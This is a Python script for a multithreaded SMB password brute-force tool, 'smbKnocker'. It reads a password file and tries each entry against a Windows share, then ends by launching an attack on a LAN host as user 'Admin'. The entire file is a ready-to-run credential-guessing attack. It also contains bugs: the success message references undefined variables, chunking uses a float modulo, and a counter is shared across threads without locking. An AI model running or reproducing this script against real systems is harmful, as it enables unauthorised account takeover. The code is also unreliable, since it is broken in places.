from smb.SMBConnection import SMBConnection
import threading
import time
class smbKnocker:
    def __init__(self):
        self.__pass = ""
        self.__stop = False
        self.__counter = 0
        self.__found = False
    def __readps(self,ps):
        f = open(ps,'r')
        x = f.read()
        f.close()
        self.__p = []
        for i in x.split('\n'):
            if i != "" and i != None:
                self.__p.append(i)
    def __show_counter(self):
        while self.__counter < len(self.__p) and not self.__stop and not self.__found:
            time.sleep(0.01)
            print("[ ... ] "+str(self.__counter)+" Passwords tested")
    def knock(self,Username="Admin",PasswordsFilePath="C://Users/John/Desktop/passwords.txt",RHOST="192.168.1.1",RPORT=445,SHARE="ShareFolder",DOMAIN="DomainName",Speed=5):
        self.__readps(PasswordsFilePath)
        counter = 0
        psize = len(self.__p)/Speed
        part = []
        ti = threading.Thread(target=self.__show_counter,args=[])
        ti.start()
        while not self.__stop:
            if counter >= len(self.__p):
                if len(part) > 0:
                    self.__create_thread(Username,RHOST,RPORT,SHARE,DOMAIN,part)
                    part = []
                    break
            if counter != 0 and counter%psize == 0:
                self.__create_thread(Username,RHOST,RPORT,SHARE,DOMAIN,part)
                part = []
            else:
                part.append(self.__p[counter])
                counter += 1
        while self.__counter < len(self.__p) and not self.__found:
            time.sleep(1)
        if self.__found:
            print("[ YYY ] Password: "+self.__pass)
        else:
            print("[ !!! ] No passwords matched")
    def __create_thread(self,username,rhost,rport,share,domain,passes=[]):
        t = threading.Thread(target=self.__check,args=[username,rhost,rport,share,domain,passes])
        t.start()
    def __check(self,username,rhost,rport,share,domain,passes):
        for pas in passes:
            if self.__stop:
                break
            conn = SMBConnection(username,pas,share,rhost,domain,
                            use_ntlm_v2=True,
                            sign_options=SMBConnection.SIGN_WHEN_SUPPORTED,
                            is_direct_tcp=True) 
            connected = conn.connect(rhost,rport)
            self.__counter += 1
            if connected:
                print("[ + ] Username: "+user+" Password: "+userpass[user])
                self.__pass = pas
                self.__stop = True
                self.__found = True
                break
obj = smbKnocker()
obj.knock("Admin","C://Users/John/Desktop/passwords.txt","192.168.1.20",445,"share","domainname",10)